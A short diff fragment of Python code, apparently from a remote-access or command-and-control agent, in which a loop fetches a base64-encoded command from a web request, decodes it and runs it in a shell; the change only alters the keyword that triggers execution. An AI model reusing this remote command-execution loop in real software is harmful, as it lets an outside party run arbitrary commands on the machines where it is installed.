@@ -128,7 +128,7 @@ def core():
 			b64enccmd = web_request(getcmd)
 			line = b64decstr(b64enccmd)
 						
-			if 'Time' in line:
+			if 'echo' in line:
 			
 				raw = exec_shell_cmd(line)
 				raw_str = str(raw)
